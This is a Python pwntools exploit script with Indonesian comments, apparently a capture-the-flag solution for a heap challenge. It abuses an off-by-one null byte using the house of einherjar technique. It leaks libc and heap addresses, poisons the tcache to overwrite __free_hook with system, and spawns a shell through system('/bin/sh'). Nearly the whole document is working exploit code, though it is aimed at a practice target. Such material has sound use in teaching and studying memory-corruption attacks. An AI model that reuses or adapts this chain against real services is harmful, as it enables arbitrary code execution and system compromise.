"""
exploit based on https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_einherjar.c
pada fungsi read_str, jika kita memasukkan size 0 maka nilai yang akan diubah ke 0 adalah buf[255].
kita dapat memakai teknik house of einherjar untuk mengoverwrite fd pointer chunk yang telah di free
sehingga saat malloc dipanggil kita dapat melakukan write ke arbitray address.
"""

from pwn import *

l = ELF("./libc.so", checksec=False)

r = remote("0.0.0.0", 51707)

def login(user):
    r.sendlineafter(": ", user)

def logout():
    r.sendlineafter("> ", '6')

def add_str(inx, size, name, shellcode):
    r.sendlineafter("> ", '1')
    r.sendlineafter(": ", str(inx))
    r.sendlineafter(": ", str(size))
    r.sendafter(": ", name)
    r.sendafter(": ", shellcode)

def add_str_hex(inx, size, name, shellcode):
    r.sendlineafter("> ", '2')
    r.sendlineafter(": ", str(inx))
    r.sendlineafter(": ", str(size))
    r.sendafter(": ", name)

    sh = ''
    for i in shellcode:
        sh += '{0:02x}'.format(i)
    r.sendafter(": ", sh)

def delete(inx):
    r.sendlineafter("> ", '5')
    r.sendlineafter(": ", str(inx))
    a = u64(r.recvuntil(" ")[:-1].ljust(8, b'\x00'))
    return a

def get_shell(inx):
    r.sendlineafter("> ", '5')
    r.sendlineafter(": ", str(inx))
    r.interactive()
    

## leak libc and heap address

login(b'aaaa')

for i in range(8):
    add_str(i, 0x60, b'aaaa', b'bbbb')

for i in range(8-1, 1, -1):
    delete(i)

heap_leak = delete(1)
libc_leak = delete(0)
print("heap :", hex(heap_leak))
print("libc :", hex(libc_leak))

l.address = libc_leak - 0x1ebbe0
heap = heap_leak + 0x400

for i in range(8):
    add_str(i, 0x60, b'aaaa', b'bbbb')

## Buat beberapa heap chunk

# Vuln chunk
add_str(8, 1, p64(0xbeef000a), 'z') # Chunk A = vuln chunk (size = 0)

# Fake chunk
p = b'a'*0x57    # padding
p += p64(0)      # prev_size
p += p64(0x70)   # chunk size
p += p64(heap)*2 # fd & bk pointer
p += b'\n'
add_str(9, 0x8f, p64(0xbeef000b), p) # Chunk B = fake chunk location (size = 0xb0) -> (0xb0-0x8-0x19 = 0x8f)

# chunk yang akan dioverlap dan set prev_size chunk selanjutnya
add_str_hex(10, 0x1f, p64(0xbeef000c), b'x'*(0x1f-0x8) + p64(0x70)) # Chunk C = overlap Chunk (size = 0x40) -> (0x40-0x8-0x19 = 0x1f)

# chunk yang akan dioverwrite dengan null byte
add_str(11, 0xdf, p64(0xbeef000d), b'asdf') # Chunk D = overwrite Chunk (size = 0x100) -> (0x100-0x8-0x19 = 0xdf)

# chunk padding
add_str(12, 0x1f, p64(0xbeef000e), b'XXXX') # Chunk E = Chunk pad (size = 0x40) -> (0x40-0x8-0x19 = 0x1f)


## heap exploit

# delete Chunk A dan buat lagi untuk melakukan poison null byte
delete(8)
add_str(8, 0, p64(0xbeef000a), '') # vuln

# Chunk D prev_inuse bit telah dioverwrite
# lalu penuhkan tchace
for i in range(7):
    add_str(13+i, 0xdf, p64(0xcaaaaaafeeee), b'asdf')
for i in range(7):
    delete(13+i)

# delete Chunk padding (Chunk E) dan Chunk yang akan dioverlap (Chunk C)
delete(12) # Chunk E
delete(10) # Chunk C

# delete Chunk D
delete(11)

# logout and login kembali untuk mengoverwrite fd pointer Chunk C
logout()

p = p64(0)*5
p += p64(0x41)
p += p64(l.symbols['__free_hook'])*2
login(p) # overwrite Chunk C

# Sekarang fd pointer Chunk C telah dioverwrite dengan address __free_hook
# Buat 2 chunk lagi dengan size 0x40 untuk mengoverwrite __free_hook dengan address system
add_str(10, 0x1f, '/bin/sh\n', b'YYYY') # untuk argumen system
add_str(11, 0x1f, p64(l.symbols['system']), b'\n') # overwrite __free_hook

# Delete chunk dengan string "/bin/sh" untuk memanggil system("/bin/sh")
get_shell(10)
